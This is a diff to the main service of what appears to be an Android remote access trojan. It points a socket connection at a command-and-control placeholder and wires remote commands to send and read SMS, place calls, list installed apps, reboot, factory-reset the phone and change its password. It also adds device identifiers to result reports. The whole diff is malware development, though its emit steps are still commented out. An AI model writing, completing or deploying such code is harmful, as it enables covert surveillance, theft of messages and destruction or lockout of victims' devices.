@@ -6,6 +6,7 @@ import android.app.Service;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Handler;
@@ -16,9 +17,11 @@ import android.util.Log;
 
 import androidx.core.app.ActivityCompat;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.net.URI;
+import java.util.List;
 
 import io.socket.client.IO;
 import io.socket.client.Socket;
@@ -26,8 +29,8 @@ import io.socket.emitter.Emitter;
 
 public class MainService extends Service {
 
-    Socket ioSocket = IO.socket(URI.create("http://192.168.54.11:5001"));
-
+    Socket ioSocket = IO.socket(URI.create("http://C2_ADDRESS:5001"));
+    @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -38,7 +41,6 @@ public class MainService extends Service {
             @SuppressLint("HardwareIds")
             public void run() {
                 try {
-                    @SuppressLint("HardwareIds") String device_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
                     String manufacturer = Build.MANUFACTURER.substring(0, 1).toUpperCase() + Build.MANUFACTURER.substring(1);
                     String model = Build.MODEL;
                     int apiLevel = Build.VERSION.SDK_INT;
@@ -76,9 +78,9 @@ public class MainService extends Service {
                     ioSocket.on("0xC", listInstalledApps);
                     ioSocket.on("0xD", vibratePhone);
                     ioSocket.on("0xE", changeWallpaper);
-                    ioSocket.on("0xE", factoryResetDevice);
-                    ioSocket.on("0xE", rebootDevice);
-                    ioSocket.on("0xE", changeDevicePassword);
+                    ioSocket.on("0xF", factoryResetDevice);
+                    ioSocket.on("0x10", rebootDevice);
+                    ioSocket.on("0x11", changeDevicePassword);
 
                     if(!ioSocket.connected()){
                         ioSocket.connect();
@@ -100,10 +102,13 @@ public class MainService extends Service {
             try{
                 int result = SMS.sendSMS(args[0].toString(), args[1].toString());
                 JSONObject jsonObject = new JSONObject();
+                jsonObject.put("device_id", device_id);
                 if (result == 0){
-                    jsonObject.put("status", "SMS to " + args[1].toString() + " sent successfully");
+                    jsonObject.put("status",  "success");
+                    jsonObject.put("message", "SMS to " + args[1].toString() + " sent successfully");
                 } else{
-                    jsonObject.put("status", "SMS to " + args[1].toString() + " failed");
+                    jsonObject.put("status",  "failed");
+                    jsonObject.put("message", "SMS to " + args[1].toString() + " failed");
                 }
                 // emit result
             } catch (Exception exception) {
@@ -117,10 +122,15 @@ public class MainService extends Service {
         public void call(Object... args) {
             try {
                 JSONObject jsonObject = new JSONObject();
-                jsonObject = SMS.readSMS(getApplicationContext());
-                if (jsonObject != null) {
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("data", SMS.readSMS(getApplicationContext()));
+                if (jsonObject.get("data") != null) {
+                    jsonObject.put("status",  "success");
+                    jsonObject.put("message", "SMS successfully read");
                     // emit json
                 }else {
+                    jsonObject.put("status",  "failed");
+                    jsonObject.put("message", "Failed to read SMS");
                     // emit failed
                 }
             } catch (Exception exception) {
@@ -150,10 +160,16 @@ public class MainService extends Service {
         @Override
         public void call(Object... args) {
             try {
+                JSONObject jsonObject = new JSONObject();
                 int result = Voice.phoneCall(getApplicationContext(), args[0].toString());
+                jsonObject.put("device_id", device_id);
                 if (result == 0) {
+                    jsonObject.put("status", "success");
+                    jsonObject.put("message", "Calling " + args[0].toString());
                     // emit success
-                }else {
+                } else {
+                    jsonObject.put("status", "failed");
+                    jsonObject.put("message", "Call to " + args[0].toString() + " failed");
                     // emit failure
                 }
             } catch (Exception exception) {
@@ -216,7 +232,15 @@ public class MainService extends Service {
     private Emitter.Listener listInstalledApps = new Emitter.Listener() {
         @Override
         public void call(Object... args) {
-
+            List installedApps = InstalledApps.getInstalledApps(getApplicationContext());
+            JSONObject jsonObject = new JSONObject();
+            try {
+                jsonObject.put("device_id", device_id);
+                jsonObject.put("data", installedApps.toString());
+                // if json data is empty emit failed else success
+            } catch (JSONException jsonException) {
+                jsonException.printStackTrace();
+            }
         }
     };
 
